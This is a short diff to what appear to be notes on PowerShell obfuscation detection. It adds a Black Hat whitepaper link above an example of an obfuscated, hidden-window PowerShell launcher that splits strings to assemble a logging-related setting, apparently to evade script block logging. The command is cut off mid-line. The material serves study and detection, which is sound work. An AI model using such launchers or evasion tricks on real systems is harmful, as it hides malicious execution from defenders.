@@ -1,3 +1,5 @@
+https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf
+
 # Example:
 ```
 "powershell.exe" -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $tjtrJ=((''''+''Enabl{3}Sc{''+''2}ipt{1}lo''+''c{4}{0''+''}nv''+''ocation{5}ogg''+''i''+''ng'')-f''I'',''B'',''r'',''e'',''k'',''L'');
